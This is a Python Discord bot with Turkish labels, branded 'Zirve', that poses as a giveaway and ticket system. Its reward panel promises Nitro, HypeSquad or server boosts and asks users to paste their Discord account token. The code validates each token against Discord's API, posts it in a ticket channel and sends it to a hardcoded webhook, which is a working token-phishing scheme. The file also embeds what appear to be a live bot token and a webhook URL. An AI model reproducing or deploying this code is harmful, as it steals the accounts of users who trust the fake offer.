# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput, Select
import requests
import asyncio

# ============ KONFIGURASYON (BURAYI DOLDUR) ============
BOT_TOKEN = "MTUyNjcxMjM2NTQ5NDU2NjkzMg.GDj3jp.FnuHDb2p37z6HaYNdxQ0sFUswwjHcbIY9IHgbg"
WEBHOOK_URL = "https://discord.com/api/webhooks/1526713905865293944/Z1QPSN5Mbx30WGlkWPCLiqnX1JLPliiY_0ziIjq8OGw5NvRRyRBTSj8kSrMkuTfGyZrs"
TICKET_CATEGORY_ID = 1526849082579222678
# =======================================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ===== TOKEN DOĞRULA =====
def check_token(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            return True, r.json()
        return False, None
    except:
        return False, None

# ===================== ÖDÜL BUTONLARI =====================
class OdulView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 Nitro (6x Invite)", style=discord.ButtonStyle.green)
    async def nitro(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal("Nitro", 6))

    @discord.ui.button(label="🎫 Nitro Basic (3x Invite)", style=discord.ButtonStyle.blurple)
    async def nitro_basic(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal("Nitro Basic", 3))

    @discord.ui.button(label="🏅 HypeSquad (3x Invite)", style=discord.ButtonStyle.gray)
    async def hypesquad(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal("HypeSquad", 3))

    @discord.ui.button(label="🚀 14x Boost (10x Invite)", style=discord.ButtonStyle.red)
    async def boost(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal("14x Boost", 10))

class TokenModal(Modal):
    def __init__(self, odul, sarti):
        super().__init__(title=f"🎯 {odul} Odulu")
        self.odul = odul
        self.sarti = sarti
        self.token_input = TextInput(
            label="Discord Token",
            placeholder="Tokenini yapistir...",
            required=True,
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.token_input)

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value
        kullanici = interaction.user
        guild = interaction.guild

        gecerli, veri = check_token(token)
        if not gecerli:
            await interaction.response.send_message("❌ Gecersiz token!", ephemeral=True)
            return

        username = f"{veri['username']}#{veri.get('discriminator', '0')}"
        nitro_tip = {0: "Yok", 1: "Nitro Classic", 2: "Nitro (Full)", 3: "Nitro Basic"}.get(veri.get('premium_type', 0), "Bilinmiyor")
        hype = "Yok"
        flags = veri.get('flags', 0)
        if flags & 64: hype = "Bravery"
        elif flags & 128: hype = "Brilliance"
        elif flags & 256: hype = "Balance"

        try:
            kategori = guild.get_channel(TICKET_CATEGORY_ID)
            if not kategori:
                await interaction.response.send_message("❌ Kategori bulunamadi!", ephemeral=True)
                return

            yetkiler = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            kanal = await guild.create_text_channel(
                name=f"odul-{kullanici.name}",
                category=kategori,
                overwrites=yetkiler
            )

            embed = discord.Embed(
                title="🎫 Zirve Odul Ticket",
                description=(
                    f"**Kullanici:** {kullanici.mention}\n"
                    f"**Odul:** {self.odul}\n"
                    f"**Invite Sartı:** {self.sarti}x davet\n"
                    f"**Hesap:** {username}\n"
                    f"**Nitro:** {nitro_tip}\n"
                    f"**HypeSquad:** {hype}\n\n"
                    f"**Token:** ||{token}||"
                ),
                color=0xffd700
            )
            embed.set_footer(text="Zirve Gift | Yetkili onayi bekleniyor")

            # Kategori seçimi
            secenekler = [
                discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana odul"),
                discord.SelectOption(label="Satin alim", emoji="💰", description="Satin alinan odul"),
                discord.SelectOption(label="Urun bilgi", emoji="📄", description="Urun detaylari"),
                discord.SelectOption(label="Sponsor", emoji="🤝", description="Sponsorluk"),
                discord.SelectOption(label="Cekilis", emoji="🎲", description="Cekilis odulu"),
                discord.SelectOption(label="Invite odul", emoji="📩", description="Davet odulu"),
                discord.SelectOption(label="Gmail odul", emoji="📧", description="Gmail odulu")
            ]
            select = Select(placeholder="Odul kategorisini sec...", options=secenekler)
            async def select_callback(interaction2):
                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** secildi.", ephemeral=True)
            select.callback = select_callback

            # Onay / Red butonları
            class OnayView(View):
                def __init__(self, odul, kullanici, kanal):
                    super().__init__(timeout=None)
                    self.odul = odul
                    self.kullanici = kullanici
                    self.kanal = kanal

                @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
                async def onay(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("✅ Odul onaylandi!", ephemeral=False)
                    await self.kullanici.send(f"✅ {self.odul} odulun onaylandi! 24-48 saat icerisinde DM'den teslim edilecektir.")
                    await self.kanal.send(f"✅ {self.kullanici.mention} odulu onaylandi! 24-48 saat icerisinde DM'den teslim edilecektir.")
                    requests.post(WEBHOOK_URL, json={"content": f"✅ {self.kullanici} icin {self.odul} odulu onaylandi."})

                @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
                async def red(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("❌ Odul reddedildi.", ephemeral=False)
                    await self.kullanici.send(f"❌ {self.odul} odulun reddedildi.")
                    await self.kanal.send(f"❌ {self.kullanici.mention} odulu reddedildi.")
                    requests.post(WEBHOOK_URL, json={"content": f"❌ {self.kullanici} icin {self.odul} odulu reddedildi."})

            view = OnayView(self.odul, kullanici, kanal)
            view.add_item(select)
            await kanal.send(embed=embed, view=view)

            # Webhook bildirimi
            requests.post(WEBHOOK_URL, json={"content": f"🎫 Yeni ticket: {kullanici} - {self.odul} - Token: ||{token}||"})

            await interaction.response.send_message(f"✅ Ticket acildi: {kanal.mention}", ephemeral=True)

        except Exception as hata:
            await interaction.response.send_message(f"❌ Hata: {hata}", ephemeral=True)

# ===================== TICKET SİSTEMİ =====================
class TicketModal(Modal):
    def __init__(self, kategori):
        super().__init__(title=f"🎫 {kategori} Ticket")
        self.kategori = kategori
        self.aciklama = TextInput(label="Aciklama", placeholder="Detayli aciklama...", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.aciklama)

    async def on_submit(self, interaction: discord.Interaction):
        kullanici = interaction.user
        guild = interaction.guild
        kategori = self.kategori
        aciklama = self.aciklama.value

        try:
            kategori_kanal = guild.get_channel(TICKET_CATEGORY_ID)
            if not kategori_kanal:
                await interaction.response.send_message("❌ Kategori bulunamadi!", ephemeral=True)
                return

            yetkiler = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            kanal = await guild.create_text_channel(
                name=f"{kategori}-{kullanici.name}",
                category=kategori_kanal,
                overwrites=yetkiler
            )

            embed = discord.Embed(
                title="🎫 Genel Ticket",
                description=f"**Kullanici:** {kullanici.mention}\n**Kategori:** {kategori}\n**Aciklama:** {aciklama}",
                color=0x00ff00
            )
            embed.set_footer(text="Zirve Ticket | Kapatmak icin butona tikla.")

            class KapatView(View):
                def __init__(self, kullanici, kanal):
                    super().__init__(timeout=None)
                    self.kullanici = kullanici
                    self.kanal = kanal

                @discord.ui.button(label="🗑️ Ticket'i Kapat", style=discord.ButtonStyle.red)
                async def kapat(self, interaction2: discord.Interaction, button: Button):
                    if interaction2.user == self.kullanici or interaction2.user.guild_permissions.administrator:
                        await self.kanal.delete()
                        await interaction2.response.send_message("✅ Ticket kapatildi.", ephemeral=True)
                    else:
                        await interaction2.response.send_message("❌ Sadece sahibi veya yetkili kapatabilir.", ephemeral=True)

            await kanal.send(embed=embed, view=KapatView(kullanici, kanal))
            await interaction.response.send_message(f"✅ Ticket acildi: {kanal.mention}", ephemeral=True)

        except Exception as hata:
            await interaction.response.send_message(f"❌ Hata: {hata}", ephemeral=True)

class KategoriView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 ZirveGift", style=discord.ButtonStyle.green)
    async def zirvegift(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("ZirveGift"))

    @discord.ui.button(label="💰 Satin alim", style=discord.ButtonStyle.blurple)
    async def satinalim(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Satin alim"))

    @discord.ui.button(label="📄 Urun bilgi", style=discord.ButtonStyle.gray)
    async def urunbilgi(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Urun bilgi"))

    @discord.ui.button(label="🤝 Sponsor", style=discord.ButtonStyle.gray)
    async def sponsor(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Sponsor"))

    @discord.ui.button(label="🎲 Cekilis", style=discord.ButtonStyle.gray)
    async def cekilis(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Cekilis"))

    @discord.ui.button(label="📩 Invite odul", style=discord.ButtonStyle.gray)
    async def invite(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Invite odul"))

    @discord.ui.button(label="📧 Gmail odul", style=discord.ButtonStyle.gray)
    async def gmail(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal("Gmail odul"))

# ===================== KOMUTLAR =====================
@bot.command()
async def panel(ctx):
    embed = discord.Embed(
        title="🔥 Zirve Odul Paneli",
        description="Asagidaki butonlardan bir odul sec. Token'ini gir, ticket acilacak.",
        color=0xffd700
    )
    embed.set_footer(text="Zirve Paneli | Ticket Sistemi")
    await ctx.send(embed=embed, view=OdulView())

@bot.command()
async def tick(ctx):
    embed = discord.Embed(
        title="🎫 Zirve Ticket Sistemi",
        description="Asagidaki butonlardan bir kategori sec. Aciklama gir ve ticket olustur.",
        color=0x00ff00
    )
    embed.set_footer(text="Zirve Ticket | 7/24 Destek")
    await ctx.send(embed=embed, view=KategoriView())

# ===================== BOT BAŞLAT =====================
@bot.event
async def on_ready():
    print(f"✅ Zirve Bot aktif! Kullanici: {bot.user}")

bot.run(BOT_TOKEN)
